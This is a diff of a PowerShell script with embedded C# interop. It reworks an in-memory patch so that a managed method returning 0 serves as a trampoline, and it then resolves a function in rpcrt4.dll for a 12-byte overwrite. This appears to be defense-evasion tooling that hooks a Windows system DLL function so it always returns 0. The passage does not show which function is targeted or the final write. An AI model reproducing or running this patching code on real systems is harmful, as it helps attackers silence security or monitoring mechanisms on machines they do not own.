@@ -11,15 +11,12 @@ public class Mem {
 
     [DllImport("kernel32.dll")]
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
 
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
-
-    [DllImport("kernel32.dll")]
-    public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
-
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetCurrentProcess();
+public class Patch {
+    public static int Trampoline() {
+        return 0;
+    }
 }
 "@
 
@@ -29,23 +26,14 @@ $MEM_COMMIT = 0x1000
 $MEM_RESERVE = 0x2000
 $PATCH_SIZE = 12
 
-# Allocate trampoline: mov eax, 0; ret
-$size = [UIntPtr]::op_Explicit(0x1000)
-$trampoline = [Mem]::VirtualAlloc([IntPtr]::Zero, $size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
+# Get address of the trampoline
+$trampoline = [IntPtr][Patch].GetMethod("Trampoline").MethodHandle.GetFunctionPointer()
 
 # Exit if trampoline allocation failed
 if ($trampoline -eq [IntPtr]::Zero) {
-    Write-Error "[-] Failed to allocate trampoline."
+    Write-Error "[-] Failed to resolve trampoline address."
     return
 }
-
-# Write hook: mov eax, 0; ret
-$hook = [byte[]](0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy($hook, 0, $trampoline, $hook.Length)
-
-# Flush instruction cache
-$len = [UIntPtr]::op_Explicit($hook.Length)
-[Mem]::FlushInstructionCache([Mem]::GetCurrentProcess(), $trampoline, $len) | Out-Null
 
 # Get function address
 $lib = [Mem]::LoadLibrary("rpcrt4.dll")
